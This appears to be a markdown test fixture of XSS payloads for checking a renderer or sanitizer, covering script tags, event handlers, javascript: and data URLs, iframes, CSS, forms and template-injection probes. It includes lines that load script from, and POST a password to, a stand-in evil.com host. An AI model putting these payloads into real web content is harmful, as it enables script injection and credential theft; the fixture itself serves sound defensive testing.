# XSS Injection Test Document

This markdown document contains various XSS injection attempts:

## Script Tags

<script>alert('XSS')</script>
<script src="http://evil.com/xss.js"></script>
<ScRiPt>alert(1)</ScRiPt>

## Event Handlers

<img src=x onerror='alert(1)'>
<body onload='alert(1)'>
<svg onload='alert(1)'></svg>
<input onfocus='alert(1)' autofocus>
<marquee onstart='alert(1)'>XSS</marquee>

## JavaScript URLs

[Click me](javascript:alert('XSS'))
[Innocent link](vbscript:msgbox('XSS'))
![Image](javascript:alert(1))

## Data URLs

![](data:text/html,<script>alert('XSS')</script>)
[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
![](data:image/svg+xml,<svg onload='alert(1)'>)

## Malicious iframes

<iframe src='javascript:alert(1)'></iframe>
<iframe srcdoc='<script>alert(1)</script>'></iframe>
<iframe src='data:text/html,<script>alert(1)</script>'></iframe>

## CSS Injection

<style>body{background:url('javascript:alert(1)')}</style>
<div style='background-image:url(javascript:alert(1))'>
<link rel="stylesheet" href="javascript:alert(1)">

## Meta Refresh

<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
<meta http-equiv="Set-Cookie" content="xss=true">

## Form Actions

<form action='javascript:alert(1)'><input type='submit'></form>
<form method="POST" action="http://evil.com/steal">
  <input name="password" type="password">
</form>

## Object/Embed

<object data='javascript:alert(1)'></object>
<embed src='javascript:alert(1)'>
<applet code="javascript:alert(1)"></applet>

## HTML5 Features

<video src="javascript:alert(1)">
<audio src="javascript:alert(1)">
<source src="javascript:alert(1)">

## Template Injection

{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

## Other Vectors

<base href="javascript:alert(1)//">
<link rel="import" href="javascript:alert(1)">
<!--[if IE]><script>alert(1)</script><![endif]-->